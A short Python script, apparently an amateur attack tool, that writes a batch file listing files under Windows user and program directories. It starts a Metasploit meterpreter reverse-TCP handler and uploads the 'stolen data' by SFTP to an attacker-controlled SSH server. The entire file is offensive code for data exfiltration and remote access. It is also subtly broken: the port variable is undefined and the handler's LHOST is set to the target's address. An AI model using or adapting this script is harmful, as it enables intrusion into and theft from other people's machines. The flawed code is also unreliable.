#!/usr/bin/env python

import os
import paramiko

# Set the target Windows machine's IP address
target_ip = "ip"

# Set the attacker's OpenSSH server details
ssh_server = "ip"
ssh_port = port
ssh_username = "user"
ssh_password = "pass"

# Define the paths to search for files
search_paths = [
    "C:\\Users\\",
    "C:\\Documents and Settings\\",
    "C:\\Program Files\\",
    "C:\\Program Files (x86)\\"
]

# Create a Metasploit payload that includes the file stealing script
payload = "windows/meterpreter/reverse_tcp"
script_path = "C:\\temp\\stealer.bat"

# Create the batch script for file stealing
with open(script_path, "w") as f:
    f.write("@echo off\n")
    for path in search_paths:
        f.write(f"dir /s /b {path} > {path.replace('\\', '')}_files.txt\n")

# Launch the Metasploit console
os.system("msfconsole -x \"use exploit/multi/handler; set PAYLOAD " + payload + "; set LHOST " + target_ip + "; set LPORT 4444; exploit\"")

# Connect to the attacker's OpenSSH server
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(ssh_server, port=ssh_port, username=ssh_username, password=ssh_password)

# Upload the stolen data to the OpenSSH server
with ssh.open_sftp() as sftp:
    for path in search_paths:
        sftp.put(f"{path.replace('\\', '')}_files.txt", f"/stolen_data/{path.replace('\\', '')}_files.txt")

# Close the SSH connection
ssh.close()
